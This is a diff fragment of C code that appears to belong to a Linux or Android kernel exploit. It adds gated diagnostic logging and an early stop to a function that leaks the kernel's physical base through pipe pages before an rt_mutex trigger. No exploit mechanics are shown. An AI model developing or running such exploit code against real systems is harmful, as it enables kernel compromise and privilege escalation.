@@ -1129,6 +1129,11 @@ static int slide_leak_physical_base(void) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 diagnostic stage=kernel-page-prepare-enter "
+          "pipe_base=%016zx\n", pipebuf_page_base);
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
   const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
@@ -1166,6 +1171,13 @@ static int slide_leak_physical_base(void) {
             fresh_page_attempts, page_base);
     pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
             fresh_attempt, fresh_page_attempts, page_base);
+#if defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE) && \
+    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE
+    pr_warning("p0 page-prepare diagnostic stop base=%016zx; "
+               "rt_mutex trigger not entered\n",
+               page_base);
+    return 0;
+#endif
     if (!page_base) {
 #ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
       fresh_attempt++;
@@ -1240,6 +1252,13 @@ static int slide_leak_physical_base(void) {
   return 0;
 #else
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+#if defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE) && \
+    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE
+  pr_warning("p0 page-prepare diagnostic stop base=%016zx; "
+             "rt_mutex trigger not entered\n",
+             page_base);
+  return 0;
+#endif
   if (!page_base) {
     return 0;
   }
